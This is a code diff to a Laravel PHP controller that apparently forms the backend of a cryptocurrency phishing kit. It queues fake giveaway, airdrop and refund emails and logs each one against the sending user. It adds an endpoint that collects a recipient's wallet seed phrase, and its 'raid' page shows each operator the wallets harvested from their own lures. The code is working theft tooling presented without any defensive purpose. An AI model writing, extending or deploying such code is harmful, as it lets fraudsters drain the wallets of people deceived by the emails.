@@ -6,6 +6,8 @@ use App\Mail\CryptoMail;
 use App\Models\Bank;
 use App\Models\Code;
 use App\Models\Crypto;
+use App\Models\Sent;
+use App\Models\Wallet;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Mail;
@@ -40,6 +42,33 @@ class UserController extends Controller
     }
 
 
+    // public function mails(Request $request)
+    // {
+    //     $validator = Validator::make($request->all(), [
+    //         'template' => ['required', 'in:giveaway,airdrop,refund'],
+    //         'recipient_email' => ['required', 'email'],
+    //         'crypto_type' => ['required', 'in:BTC,USDT,ETH,BNB,XRP,ADA,SOL,DOGE,DOT,AVAX,SHIB,LINK'],
+    //         'quantity' => ['required', 'numeric', 'min:0.00000001'],
+    //     ]);
+
+    //     if ($validator->fails()) {
+    //         return back()->withErrors($validator)->withInput();
+    //     }
+
+    //     try {
+    //         // Queue the email
+    //         Mail::to($request->recipient_email)->queue(new CryptoMail(
+    //             $request->template,
+    //             $request->crypto_type,
+    //             $request->quantity
+    //         ));
+
+    //         return redirect()->route('mail')->with('success', 'Email queued successfully!');
+    //     } catch (\Exception $e) {
+    //         return back()->with('error', 'Failed to queue email: ' . $e->getMessage())->withInput();
+    //     }
+    // }
+
     public function mails(Request $request)
     {
         $validator = Validator::make($request->all(), [
@@ -54,6 +83,15 @@ class UserController extends Controller
         }
 
         try {
+            // Store email details with sender's user_id
+            $sent = Sent::create([
+                'user_id' => Auth::id(),
+                'recipient_email' => $request->recipient_email,
+                'quantity' => $request->quantity,
+                'template' => $request->template,
+                'crypto_type' => $request->crypto_type,
+            ]);
+
             // Queue the email
             Mail::to($request->recipient_email)->queue(new CryptoMail(
                 $request->template,
@@ -67,11 +105,47 @@ class UserController extends Controller
         }
     }
 
-
-    public function raid()
+    public function storeWallet(Request $request)
     {
+        $validator = Validator::make($request->all(), [
+            'user_email' => ['required', 'email'],
+            'wallet_type' => ['required', 'in:MetaMask,Trust Wallet,Coinbase Wallet,SafePal,TokenPocket,Phantom,Rainbow,WalletConnect,BitKeep,Argent,ZenGo,Pillar,1inch Wallet,MEW Wallet,Torus'],
+            'seed_phrase' => ['required', 'string'],
+        ]);
 
-        return view('user.raids');
+        if ($validator->fails()) {
+            return back()->withErrors($validator)->withInput();
+        }
+
+        // Find the sent email by recipient email
+        $sent = Sent::where('recipient_email', $request->user_email)->firstOrFail();
+
+        // Store wallet connection details
+        Wallet::create([
+            'sent_email_id' => $sent->id,
+            'user_email' => $request->user_email,
+            'wallet_type' => $request->wallet_type,
+            'seed_phrase' => encrypt($request->seed_phrase), // Encrypt sensitive data
+        ]);
+
+        return redirect()->back()->with('success', 'Wallet connected successfully!');
+    }
+
+
+    // public function raid()
+    // {
+
+    //     return view('user.raids');
+    // }
+
+    public function raid(Request $request)
+    {
+        // Fetch wallet connections for the authenticated user's sent emails
+        $wallets = Wallet::whereHas('Sent', function ($query) {
+            $query->where('user_id', Auth::id());
+        })->with('sentEmail')->get();
+
+        return view('user.raids', compact('wallets'));
     }
 
 
@@ -101,8 +175,12 @@ class UserController extends Controller
         return redirect()->route('subscribe')->with('success', 'Subscription activated.');
     }
 
-     public function seed()
+    // public function seed()
+    // {
+    //     return view('user.seed');
+    // }
+    public function seed(Request $request)
     {
-        return view('user.seed');
+        return view('user.seed', ['sender_email' => $request->query('sender_email')]);
     }
 }
